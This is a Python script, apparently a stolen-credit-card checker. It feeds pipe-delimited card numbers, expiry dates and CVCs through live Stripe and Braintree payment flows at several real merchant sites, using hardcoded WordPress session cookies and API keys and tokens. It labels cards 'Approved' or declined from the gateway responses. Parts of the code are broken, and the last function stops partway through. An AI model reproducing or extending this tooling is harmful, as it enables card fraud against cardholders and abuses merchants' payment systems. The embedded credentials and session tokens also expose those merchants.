import requests
import re,json
import random
import time
import string
import base64
from bs4 import BeautifulSoup
def scc(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	headers = {
	    'authority': 'api.sayweee.net',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'none',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 12; RMX2163) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
	}
	
	response = requests.get('https://api.sayweee.net/ec/payment/card/profile/secret', headers=headers).json()
	token= response['object']['client_secret']
	tok=token.split('_secret_')[0]
	u='https://api.stripe.com/v1/setup_intents/'+tok+'/confirm'
	h={'Host':'api.stripe.com',
	'content-length':'715',
	'sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
	'accept':'application/json',
	'content-type':'application/x-www-form-urlencoded',
	'sec-ch-ua-mobile':'?1',
	'user-agent':'Mozilla/5.0 (Linux; Android 9; SM-J610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36',
	'sec-ch-ua-platform':'"Android"',
	'origin':'https://js.stripe.com',
	'sec-fetch-site':'same-site',
	'sec-fetch-mode':'cors',
	'sec-fetch-dest':'empty',
	'referer':'https://js.stripe.com/',
	'accept-encoding':'gzip, deflate, br',
	'accept-language':'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',}
	d=f'payment_method_data[type]=card&payment_method_data[billing_details][address][postal_code]=10080&payment_method_data[card][number]={n}&payment_method_data[card][cvc]={cvc}&payment_method_data[card][exp_month]={mm}&payment_method_data[card][exp_year]={yy}&payment_method_data[guid]=NA&payment_method_data[muid]=0e100e73-e324-4446-aa4b-ece060aebe1e0d0d05&payment_method_data[sid]=8576b27e-37ed-432c-9358-05b757d968d722e0df&payment_method_data[payment_user_agent]=stripe.js%2F63fd7ebb3%3B+stripe-js-v3%2F63fd7ebb3&payment_method_data[time_on_page]=62840&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_H7mnvGVpW4LhI4ODGWPT1m44&client_secret='+token
	response1=requests.post(u,headers=h,data=d)
	if 'Donation Confirmation' in text or "This page doesn't seem to exist" in text:
		return 'Approved'
	try:		
		ct=(response.json()['client_secret'])
		cts=ct.split('_secret_')[0]
	except:
		print(response.json())
		return 'Your card was declined.'
	import requests
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	data = {
	    'payment_method': id,
	    'expected_payment_method_type': 'card',
	    'use_stripe_sdk': 'true',
	    'key': 'pk_live_51IdYQ0LfHgkJerZf3qLsCoyaWQ4rQttxhjKCSgwBT2v5I8v9ro1YqMeypLPf6GgmCArfNox09l16a2HMKVNxk02z00QG312A1Y',
	    'client_secret': ct,
	}
	
	response = requests.post(
	    f'https://api.stripe.com/v1/setup_intents/{cts}/confirm',
	    headers=headers,
	    data=data,
	)
	sc=response.json()['next_action']['use_stripe_sdk']['three_d_secure_2_source']
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'source={sc}&browser=%7B%22fingerprintAttempted%22%3Afalse%2C%22fingerprintData%22%3Anull%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22en-US%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22800%22%2C%22browserScreenWidth%22%3A%22360%22%2C%22browserTZ%22%3A%22-120%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Linux%3B+Android+10%3B+K)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F120.0.0.0+Mobile+Safari%2F537.36%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=false&one_click_authn_device_support[webauthn_eligible]=false&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key=pk_live_51IdYQ0LfHgkJerZf3qLsCoyaWQ4rQttxhjKCSgwBT2v5I8v9ro1YqMeypLPf6GgmCArfNox09l16a2HMKVNxk02z00QG312A1Y'
	
	response = requests.post('https://api.stripe.com/v1/3ds2/authenticate', headers=headers, data=data)
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	params = {
	    'key': 'pk_live_51IdYQ0LfHgkJerZf3qLsCoyaWQ4rQttxhjKCSgwBT2v5I8v9ro1YqMeypLPf6GgmCArfNox09l16a2HMKVNxk02z00QG312A1Y',
	    'is_stripe_sdk': 'false',
	    'client_secret': ct,
	}
	
	response = requests.get(f'https://api.stripe.com/v1/setup_intents/{cts}', params=params, headers=headers)
	try:
		return (response.json()['last_setup_error']['message'])
	except:
		return '3d_secure_2'
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	with open('fileb3.txt', 'r') as file:
		first_line = file.readline()
	while True:
		lines='''mmmsmskskkskkskudh%7C1717276438%7CaGRUJSYa17Wmdrvft9sogZLtc3mbvT6CkTZleiJFI9T%7C116a2be7642b01ad0d9673ad62a24b7b055c6975c9e1f9131be09f0929a694e9'''
		lines = lines.strip().split('\n')
		random_line_number = random.randint(0, len(lines) - 1)
		big = lines[random_line_number]
		if big == first_line:
			pass
		else:
			break
	with open('fileb3.txt', 'w') as file:
		file.write(big)
	cookies = {
	    '_ga': 'GA1.1.774315979.1711878714',
	    '_gcl_au': '1.1.169795609.1711878714',
	    'wordpress_logged_in_262b7659d399c680c1ad181f217b3f4d': big,
	    'wfwaf-authcookie-8288059899a58842f2727962646eba72': '2451%7Cother%7Cread%7C61ed8c290d2bf7186e5b6f5cec774f0c6c1594b849562370e6447a4b8b83ccf7',
	    '_ga_J890L8ECJX': 'GS1.1.1711878714.1.1.1711878997.57.0.0',
	}
	
	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'Accept-Language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'Connection': 'keep-alive',
	    # 'Cookie': '_ga=GA1.1.774315979.1711878714; _gcl_au=1.1.169795609.1711878714; wordpress_logged_in_262b7659d399c680c1ad181f217b3f4d=visaspam77%7C1713088332%7Co1IP7tiJpkipfh2yKngvFR4oLuT02D2yLAOwRwGqmDb%7C56bf1ba7db092a0773b738a06eb7fa15b4ffd017038a897c08ef6a9a94812ab2; wfwaf-authcookie-8288059899a58842f2727962646eba72=2451%7Cother%7Cread%7C61ed8c290d2bf7186e5b6f5cec774f0c6c1594b849562370e6447a4b8b83ccf7; _ga_J890L8ECJX=GS1.1.1711878714.1.1.1711878997.57.0.0',
	    'Referer': 'https://www.huntingtonacademy.com/my-account/payment-methods/',
	    'Sec-Fetch-Dest': 'document',
	    'Sec-Fetch-Mode': 'navigate',
	    'Sec-Fetch-Site': 'same-origin',
	    'Sec-Fetch-User': '?1',
	    'Upgrade-Insecure-Requests': '1',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	response = requests.get('https://www.huntingtonacademy.com/my-account/add-payment-method/', cookies=cookies, headers=headers)
	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)	
	enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
	dec = base64.b64decode(enc).decode('utf-8')
	au=re.findall(r'"authorizationFingerprint":"(.*?)"',dec)[0]
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'authorization': f'Bearer {au}',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': '698e6aaa-6b50-4bf0-adc4-d454c57ef68a',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	                'billingAddress': {
	                    'postalCode': '11743',
	                    'streetAddress': '',
	                },
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok = response.json()['data']['tokenizeCreditCard']['token']
	
	# Note: json_data will not be serialized by requests
	# exactly as it was in the original request.
	#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"698e6aaa-6b50-4bf0-adc4-d454c57ef68a"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"4304512200105020","expirationMonth":"10","expirationYear":"2028","cvv":"323","billingAddress":{"postalCode":"11743","streetAddress":""}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
	#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
	import requests
	
	cookies = {
	    '_ga': 'GA1.1.774315979.1711878714',
	    '_gcl_au': '1.1.169795609.1711878714',
	    'wordpress_logged_in_262b7659d399c680c1ad181f217b3f4d': big,
	    'wfwaf-authcookie-8288059899a58842f2727962646eba72': '2451%7Cother%7Cread%7C61ed8c290d2bf7186e5b6f5cec774f0c6c1594b849562370e6447a4b8b83ccf7',
	    '_ga_J890L8ECJX': 'GS1.1.1711878714.1.1.1711878764.10.0.0',
	}
	
	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'Accept-Language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'Cache-Control': 'max-age=0',
	    'Connection': 'keep-alive',
	    'Content-Type': 'application/x-www-form-urlencoded',
	    # 'Cookie': '_ga=GA1.1.774315979.1711878714; _gcl_au=1.1.169795609.1711878714; wordpress_logged_in_262b7659d399c680c1ad181f217b3f4d=visaspam77%7C1713088332%7Co1IP7tiJpkipfh2yKngvFR4oLuT02D2yLAOwRwGqmDb%7C56bf1ba7db092a0773b738a06eb7fa15b4ffd017038a897c08ef6a9a94812ab2; wfwaf-authcookie-8288059899a58842f2727962646eba72=2451%7Cother%7Cread%7C61ed8c290d2bf7186e5b6f5cec774f0c6c1594b849562370e6447a4b8b83ccf7; _ga_J890L8ECJX=GS1.1.1711878714.1.1.1711878764.10.0.0',
	    'Origin': 'https://www.huntingtonacademy.com',
	    'Referer': 'https://www.huntingtonacademy.com/my-account/add-payment-method/',
	    'Sec-Fetch-Dest': 'document',
	    'Sec-Fetch-Mode': 'navigate',
	    'Sec-Fetch-Site': 'same-origin',
	    'Sec-Fetch-User': '?1',
	    'Upgrade-Insecure-Requests': '1',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	data = {
	    'payment_method': 'braintree_cc',
	    'braintree_cc_nonce_key': tok,
	    'braintree_cc_device_data': '{"device_session_id":"d5e97ccc9f799eb2267d322e412447c7","fraud_merchant_id":null,"correlation_id":"337df1cb3591edc6154038e002f7aa88"}',
	    'braintree_cc_3ds_nonce_key': '',
	    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/88yh4wp5qmm383vy/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/88yh4wp5qmm383vy"},"merchantId":"88yh4wp5qmm383vy","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["Discover","JCB","MasterCard","Visa","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"payWithVenmo":{"merchantId":"3184501200456253861","accessToken":"access_token$production$88yh4wp5qmm383vy$046fed997ac2817cff08e18b6195f802","environment":"production"},"paypalEnabled":true,"paypal":{"displayName":"Huntington Academy of Permanent Cosmetics","clientId":"AVSrt_PxsQbUo8i9Vf3OcqThKuBqMkQGg-hRLlnTHO9r55agBf5KosAkmqFdhrjvnX-iVNe6p3miaPmP","privacyUrl":null,"userAgreementUrl":null,"assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"huntingtonacademyofpermanentcosmetics_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
	    'woocommerce-add-payment-method-nonce': add_nonce,
	    '_wp_http_referer': '/my-account/add-payment-method/',
	    'woocommerce_add_payment_method': '1',
	}
	
	response = requests.post(
	    'https://www.huntingtonacademy.com/my-account/add-payment-method/',
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	text = response.text
	pattern = r'Reason: (.+?)\s*</li>'
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
	else:
		if 'Payment method successfully added.' in text:
			result = "1000: Approved"
		elif 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
		elif 'Please wait for 20 seconds.' in text:
			result = "try again"
		else:
			result = "Error"
			print('er#')
	if 'avs' in result or '1000: Approved' in result or 'Duplicate' in result or 'Insufficient Funds' in result:
		return 'Approved'
	else:
		return result
def st(card):
	import re
	card = card.strip()
	parts = re.split('[|]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]
	if "20" in yy:
		yy = yy.split("20")[1]
		import requests
	import requests
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	with open('gates.json', 'r') as file:
		json_data = json.load(file)
	sis=json_data['session']
	no=json_data['payNo']
	print('#')
	data = f'billing_details[address][city]=Huntington&billing_details[address][country]=US&billing_details[address][line1]=2058+Duncan+Avenue&billing_details[address][line2]=&billing_details[address][postal_code]=11743&billing_details[address][state]=New+York&billing_details[name]=mska&billing_details[email]=visaspam77%40gmail.com&billing_details[phone]=12076516786&type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F1a2719a8b8%3B+stripe-js-v3%2F1a2719a8b8%3B+payment-element%3B+deferred-intent%3B+autopm&referrer=https%3A%2F%2Fm.wconcept.com&time_on_page=38512&client_attribution_metadata[client_session_id]=3e09204c-1269-491d-9a58-1d0a38ac513f&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=automatic&guid=4b356589-cfc9-4ce3-bacd-87a9aabfab2d607329&muid=746feca8-88e2-4389-bf4a-e737b754c301ef05ca&sid=089297f2-263e-443d-9061-e96bf9a12bb7fc937d&key=pk_live_51N9AtrEBFG6Yi3HCOswDKdsQ2UrJe7MrhUxTY0qNHAi8qPhBvAk2F060OJO1NHthJsxlQZYjEgeKEgJujCXqaT0K00llmGj7no&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQY1GL7xm-_5KSJm8Wx3VIELHhodjUeLpSAGzDlLQjKDdFr6spyXbhlNafCrok0Ns7dliObicjBhEiwhmQJqkPF8oTe-z6oBgfESLbpuoz-b56_YLSgHuW3NsZCDp6CjVCZwkJhK5zl8sR5fKug9SXxVAaPGVfq6pYiMdBBjcgH2EsyAVMANdoXoZHPvyKHjB6J-xP0VMIhCTYWCjXVuIQAHkEs740ewEa5P3qJM4l_Zo5CrxYn1PKIw-BdK4O0e3LTVK7hFvtZ6QQGao4TenILiNBZwZvRRMC-6EODPuYkKtq6dhpq2cbIoF0vtWqTsb4UpYN8wOPdoFEqNrJns_i6d1acxck1APOMt1JxQThqdvelPqZrO1BVL0YPmqmfdk533YsRnZT_4KBrRFHtNid_B2p2fie_O1HBur3juITA7evb2_uC_rJArB7FWR1StP1s14ycsnRomw_wRy3zLfyaBinValkDmTOPpu_LpPcFpK9kDKNZjv5xI4ukR4dPQeKF-fBocHjP_g4eXL1N2UhhuwlqPtKuVXjDvV6wbJO6e5SGjpxH8DhFEZbkJvNm6m4BiWecmG1pmh583d8LC_zDJKFsqvVkpHEs3CfFVJGyQit3ajTYmCm7hG1eidlSPcNFJlb0-ljEcet_IkDBwOqX0LXzJUhtQvqxtvPJ3Bkyc4mLt--pNACYr5zrvLFwuZG13HIDJOa3Rik13CoRou2hXySWxjVu6NQ8JTctcf5RByHhJH9MBuuHblJ39UTT-rJnnBF2v756oRF42erV1C4oS81Tk1C4piPiD99RHacK1D2-Wv7ZQ-hFxrf-6P1CZzrBhGalVdEHH3rfkjqHmlZZ9TkW76DvpiBCw3yUz1lEew4Szsfipl3eTb62pGmjahMkS1agjK8l_0eYCP6BAvXSa3-n4-ymgK4jFNPAAX5nleJTJIJNfGgMn6lvPIWs9u9n_iiag5wGv1VXl4jBZIjzzVmT0wMuqo5-gw5Hu-40_vP1THmkt62q8cAZA-oNN7Ysi8zUDzCjpZw40WvTvkn7dkuF0Ifrf9Yd_P1P0iDLO8pkeNny_gBm0OHTMqfsOjZl-efLbNDz0AcAhgt8ce4Z11pAh6VjUrjJRU6bxUK-lkvQztpXW7AI1bDQSSo5gf1r4ZeBgenQXN0_xKSduNlGmlGc3lVynlVTR-F7imQcOo7NVbACiBGKCu8qXHt7UcORObq_8iUHNKP830YC5ml-DljkRiXl97wn6jpZUzlx-X689fqP8h2k2Og5uS8F44oa0miHxqOg4UfB93P15uw4JxvOx0T6unPgbPkGT6-QSsg8-6M_tHkokhDtQPXucGNV3H5dZIo5oleOscepMjysMtJk-l5_1YMNgFwYfrxdCo0cPjQWCsvebTO9jgP7Iyxe7W923vu3PujVUE5O24gmBxEWnJSlDXqtgMbx0fsqUcMmqg0jfYvJg54J0CXNV6l5gvzCnhhHQQXxg8c_6Qtf2yCgdS2ENVGe1iPpeHjUyRNHgVRE9Ly9y1_2dXKPBNE18F1daV0eNnLpfY8FIcauSltrD1Hx1Z_1PWCieP-QEcQdCG850cJ5eOQUQQz3VjnrJRlS4dHGqhPm-YgtS_3jnlutN0KRIQesXB3dJH3dU1TEA2FSA4329F5W52In23iI0cWPPbIHVDj7F2xN3cZrqLynogQICXHGZmXJdXVlfEgQhGwywWN8j5bY-Q2KF8gvj9oG8K-zeX7d0JiwqtiTdWBVV-0-dG6JBUT-6pDfvaywWc8X5UqhmrqRjko4Sj1-bvy5r-x5X4e7idXioF64KoAdL_CIuMG-xsQYvbKbQmiQZrsYvqomjgqS1GVWcs84WxVjPVK_0oU6spNhuvSBHTzP3hP9E3lqtiFqtvVxBwlkxXyCNbwIaFlfu3abLtOFMcUhCX1UnSKCgdNutVRPl_709KSQp4agB8mKAh8LRsNqaulxlCTph_hIVm-8XutOWFjgubQqTdPqP06CioCi9T3RQ5kxSdPP5RO0uoHCHn6UFYkCiVWEhkC4PFh_NGWRlOttlUTAHDswdlYoXtJsWaeKuJlq1XJZiBA-QWhoUvwsoWhGXU7gOhJVGTrwRK-JNVz4TwgejZXhwzmYSvmKoc2hhcmRfaWTOAzGDb6JrcqgzZjgyYjAxYqJwZAA.xGwqEqOskE3sQO6ZZD77bljxR2ZqyhJCKrqfHtupI5k'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	id=response.json()['id']
	cookies = {
    'recordID': '9ec818c9-94e5-4bdd-9387-77693ad0fa1a',
    '_ga': 'GA1.1.1062965470.1712470406',
    '_tt_enable_cookie': '1',
    '_ttp': 'SePZUmlmPp4tjpxSCi1sG4_2CrN',
    '_pin_unauth': 'dWlkPU5HWmpaVEV6TkRBdFlUa3lOQzAwWkdReExXSTNNemt0WldNek5ESTFOell5TTJKaw',
    '_fbp': 'fb.1.1712470408911.1674008412',
    'wusCtgryNm': 'WOMEN',
    'agreeYn': 'Y',
    'ypa': 'YP1.kMA9g6KRN-7kH7mXmnQy',
    '__stripe_mid': '746feca8-88e2-4389-bf4a-e737b754c301ef05ca',
    '_gcl_au': '1.1.444116769.1712504287',
    'apay-session-set': 'pYtmZoOoUeFPY9Xi5wsc9MbM%2F520Qf6FDKvGv3s5Dw1p0mbXoLyI3TYMKAgkDRk%3D',
    'dmSessionID': 'bb61e790-51ff-4433-a5e6-927b4c52bcc5',
    'wcus-fo-session-prod': 'cDI2NDVjYWM5YjM4MDg4ODhmZmFlMDJkYWZiN2EwYjJlNDk2NTRmNjg5MGQ5YWNmNjM0YjJlZDhk',
    'ESW_LTI': '{%22countryIso%22:%22US%22%2C%22currencyIso%22:null%2C%22pricingSyncId%22:null%2C%22isESWCountry%22:false%2C%22isFixedPricing%22:false}',
    'hidePrmNoti': 'Y',
    'hideGuideYn': 'Y',
    '_TODAYALLLIST': '%5B%7B%22todayGodSectCd%22%3A%22GOD%22%2C%22godNo%22%3A%22720088284%22%2C%22regDt%22%3A1712618711256%7D%5D',
    '__stripe_sid': '29421c03-cdf4-4c89-b519-fa96370eb693ebad0a',
    'language': 'en_US',
    'ledgerCurrency': 'USD',
    'cto_bundle': '1yUvwV8wV3g5NE4zYmtBNXVPSTR2bkpvbWhFT0FmbSUyQm4zeEdmNyUyRkt0eDF1anF3NWNrUFlHY3JCVEYybjFhZzZHRzlnUDlPdUFlSjRUWXljVWlnWUQxJTJGTmdlZFhYMExHTkVYMGFqTXNqZ1lkeXFLaXBSaUZvVzQzSnZGNm1pNUo5SEQ3NGdPRk9JczVBaDRONTRZUUtFb3Q5dFElM0QlM0Q',
    '_ga_0G3GV44XGJ': 'GS1.1.1712618630.4.1.1712619862.0.0.0',
    '_ga_5Y8Z74CC6Y': 'GS1.1.1712618622.6.1.1712619862.48.0.971558836',
}
	headers = {
	    'authority': 'm.wconcept.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'cache-control': 'max-age=0',
	    'content-type': 'application/json',
	    # 'cookie': 'recordID=9ec818c9-94e5-4bdd-9387-77693ad0fa1a; _ga=GA1.1.1062965470.1712470406; _tt_enable_cookie=1; _ttp=SePZUmlmPp4tjpxSCi1sG4_2CrN; _pin_unauth=dWlkPU5HWmpaVEV6TkRBdFlUa3lOQzAwWkdReExXSTNNemt0WldNek5ESTFOell5TTJKaw; ESW_LTI={%22countryIso%22:%22US%22%2C%22currencyIso%22:null%2C%22pricingSyncId%22:null%2C%22isESWCountry%22:false%2C%22isFixedPricing%22:false}; _fbp=fb.1.1712470408911.1674008412; wusCtgryNm=WOMEN; agreeYn=Y; hidePrmNoti=Y; ypa=YP1.kMA9g6KRN-7kH7mXmnQy; dmSessionID=0cbb0370-8d05-48f8-93ae-48ac66ce6172; wcus-fo-session-prod=cDJiZjNmMDg1NzA4NzdkNjAzMTFiNDUwZjc3YjQ1NjRlYzRhYzQ0MWNhNzQzNWYxOGE0Y2NlZjQ1; _TODAYALLLIST=%5B%7B%22todayGodSectCd%22%3A%22GOD%22%2C%22godNo%22%3A%22710791406%22%2C%22regDt%22%3A1712504249002%7D%5D; __stripe_mid=746feca8-88e2-4389-bf4a-e737b754c301ef05ca; __stripe_sid=089297f2-263e-443d-9061-e96bf9a12bb7fc937d; _gcl_au=1.1.444116769.1712504287; language=en_US; ledgerCurrency=USD; apay-session-set=pYtmZoOoUeFPY9Xi5wsc9MbM%2F520Qf6FDKvGv3s5Dw1p0mbXoLyI3TYMKAgkDRk%3D; cto_bundle=wBVrl18wV3g5NE4zYmtBNXVPSTR2bkpvbWhIUG13RXBacmlReGRpc1Q0VHNUOWMwTG0lMkI3YiUyRjhFc2xOdjNIJTJGaDZldUVHNUVYSmVNRVpBYWdhN1lmWkdBQ3Q4WlRsbHpTQ3pKWWo1QlNWQU16eHVJcU9EeDhYbUJsUEZYaDF5SWN0RVRQc3dFciUyQks1JTJCSUp4Mk5MUVl4N0dlczVnJTNEJTNE; _ga_0G3GV44XGJ=GS1.1.1712504206.1.1.1712504324.0.0.0; _ga_5Y8Z74CC6Y=GS1.1.1712504208.2.1.1712504324.9.0.1063546037',
	    'origin': 'https://m.wconcept.com',
